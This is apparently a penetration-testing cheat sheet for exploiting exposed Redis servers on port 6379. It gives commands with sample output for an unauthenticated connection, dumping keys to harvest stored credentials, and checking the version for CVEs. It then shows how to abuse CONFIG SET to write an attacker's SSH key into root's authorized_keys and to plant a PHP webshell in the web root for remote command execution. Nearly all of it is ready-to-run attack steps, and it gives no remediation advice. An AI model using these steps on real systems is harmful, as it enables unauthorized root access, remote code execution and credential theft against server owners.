# Redis (6379)

### Connect (no auth)

Try without password — Default: no authentication

```bash
redis-cli -h $IP
```

<details>
<summary>Example Output</summary>

```
redis-cli -h 10.10.10.5
10.10.10.5:6379> INFO server
redis_version:5.0.7
10.10.10.5:6379> KEYS *
1) "session:admin"
2) "credentials"
```
</details>

---

### Dump all keys

After connecting — Stored credentials, session data

```bash
KEYS *
GET <key>
```

<details>
<summary>Example Output</summary>

```
KEYS *
1) "session:admin:token"
2) "user:admin:password"
3) "config:db_pass"

GET user:admin:password
"SuperSecret123!"
(Credentials stored in Redis)
```
</details>

---

### Server info

Version, memory, clients — Check version for exploits

```bash
INFO
```

<details>
<summary>Example Output</summary>

```
INFO
redis_version:5.0.7
os:Linux 5.4.0-42-generic x86_64
connected_clients:2
(Check version for CVEs, 5.x has several RCEs)
```
</details>

---

### Write SSH key

Write your SSH key to server — Root SSH access

```bash
redis-cli -h $IP
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload '<ssh-rsa key>'
SAVE
```

<details>
<summary>Example Output</summary>

```
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload 'ssh-rsa AAAA...your_key...'
SAVE

ssh root@10.10.10.5
root@target:~# whoami
root
(Root SSH access via Redis write)
```
</details>

---

### Write webshell

If web server present — RCE via webshell

```bash
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["cmd"]); ?>'
SAVE
```

<details>
<summary>Example Output</summary>

```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["cmd"]); ?>'
SAVE

curl http://10.10.10.5/shell.php?cmd=whoami
www-data
(RCE via Redis webshell write)
```
</details>

---
